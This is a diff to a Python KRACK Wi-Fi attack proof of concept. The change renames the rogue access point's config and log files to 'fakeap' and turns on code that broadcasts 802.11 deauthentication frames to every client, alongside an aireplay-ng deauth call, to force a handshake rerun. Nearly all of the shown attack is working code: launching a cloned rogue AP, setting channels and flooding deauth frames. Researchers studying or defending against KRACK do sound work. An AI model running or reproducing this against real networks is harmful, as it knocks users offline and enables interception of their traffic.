@@ -625,12 +625,12 @@ class KRAckAttack():
 			subprocess.check_output(["ifconfig", self.nic_real_clientack, "up"])
 
 		# Set up a rogue AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
-		with open(os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd_rogue.conf")), "w") as fp:
+		with open(os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd_fakeap.conf")), "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
 		# hostapd_path = os.path.realpath((os.path.join(self.script_path, "../hostapd/hostapd")) + ' ' + os.path.realpath(os.path.join(self.script_path, "hostapd_rogue.conf")) + " -dd" + " -K")
 		# /home/sun10/krackattacks-poc-zerokey/hostapd/hostapd
-		self.hostapd = subprocess.Popen("hostapd /home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf -dd -K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-		self.hostapd_log = open("hostapd_rogue.log", "w")
+		self.hostapd = subprocess.Popen("hostapd /home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_fakeap.conf -dd -K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+		self.hostapd_log = open("hostapd_fakeap.log", "w")
 		
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
 		time.sleep(10)
@@ -646,9 +646,9 @@ class KRAckAttack():
 		subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
 
 		# deauthenticated 所有 client端，讓 AP 端重新四次交握
-		# dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.apmac, addr3=self.apmac)
-		# deauth = dot11/Dot11Deauth(reason=3)
-		# self.sock_real.send(deauth, True, self.netconfig.real_channel)
+		dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.apmac, addr3=self.apmac)
+		deauth = dot11/Dot11Deauth(reason=3)
+		self.sock_real.send(deauth, True, self.netconfig.real_channel)
 		subprocess.call(["aireplay-ng", "-0", "10", "-a", self.apmac, "-c", self.clientmac, self.nic_real_mon])
 
 		# For good measure, also queue a dissasociation to the targeted client on the rogue channel
